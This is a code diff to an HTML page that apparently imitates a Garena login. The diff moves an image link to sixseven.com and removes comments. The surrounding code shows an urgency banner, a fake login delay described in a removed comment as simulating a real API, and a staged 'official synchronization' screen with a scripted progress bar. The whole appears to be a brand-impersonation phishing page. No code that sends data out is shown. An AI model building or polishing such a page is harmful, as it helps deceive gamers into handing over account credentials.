@@ -7,7 +7,6 @@
 
     <link rel="icon" href="output-onlinepngtools.png" type="image/jpeg">
 
-    
     <style>
         :root {
             --garena-orange: #ff4500;
@@ -121,39 +120,33 @@
         .footer-links { margin-top: 30px; font-size: 11px; color: #888; text-align: center; z-index: 1; font-weight: 500; }
         .footer-links span { margin: 0 5px; text-decoration: underline; cursor: pointer; }
 
-        /* ======== ESTILOS DO BOTÃO FLUTUANTE ======== */
+        /* ======== ESTILOS DO BOTÃO IMAGEM NO CANTO SUPERIOR ESQUERDO ======== */
         .botao-flutuante {
             position: fixed;
-            bottom: 20px; /* Distância do fundo */
-            right: 20px;  /* Distância da direita */
+            top: 20px;  /* Distância do topo */
+            left: 20px; /* Distância da esquerda */
             z-index: 9999; /* Fica acima de tudo */
-            transition: transform 0.3s ease;
         }
         
         .botao-flutuante img {
-            width: 60px; /* Tamanho da imagem */
+            width: 60px; /* Tamanho da imagem. Pode alterar se quiser maior ou menor */
             height: 60px;
-            border-radius: 50%; /* Deixa a imagem redonda (opcional) */
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             cursor: pointer;
-        }
-
-        .botao-flutuante:hover {
-            transform: scale(1.1); /* Efeito de aumentar ao passar o mouse */
+            border: none;
+            outline: none;
         }
     </style>
 </head>
 <body>
 
-<!-- BOTÃO FLUTUANTE -->
-<a href="http://sixseven.com" target="_blank" class="botao-flutuante">
-    <img src="uuu.png" alt="Visite SixSeven">
+<!-- BOTÃO IMAGEM SUPERIOR ESQUERDO -->
+<a href="http://sixseven.com" class="botao-flutuante">
+    <img src="uuu.png" alt="">
 </a>
 
 <div class="overlay"></div>
 
 <div class="container" id="tela1">
-    <!-- Removido o filter: invert(1) daqui -->
     <img src="logoff.png" alt="Garena" class="logo-img">
     
     <div class="urgency-banner">
@@ -210,7 +203,6 @@
 
 <!-- TELA 3: Sincronização Oficial -->
 <div class="container hidden" id="tela3">
-    <!-- Removido o filter: invert(1) daqui também -->
     <img src="logoff.png" alt="Garena" class="logo-img" style="max-width: 120px;">
     
     <h2 style="font-size: 18px; color: var(--garena-dark); margin-top: 20px;">Processando Solicitação</h2>
@@ -279,7 +271,6 @@
         btn.innerText = "Verificando...";
         btn.style.opacity = "0.7";
 
-        // Simula o tempo que uma API real levaria para fazer login
         setTimeout(() => {
             trocarTela('tela1', 'tela2');
         }, 1500);
@@ -304,7 +295,6 @@
             { limite: 100, texto: "Finalizando protocolo seguro." }
         ];
 
-        // Barra fluida e corporativa (demora cerca de 12-15 segundos)
         const intervalo = setInterval(() => {
             progresso += (Math.random() * 0.8);
             if (progresso >= 100) progresso = 100;
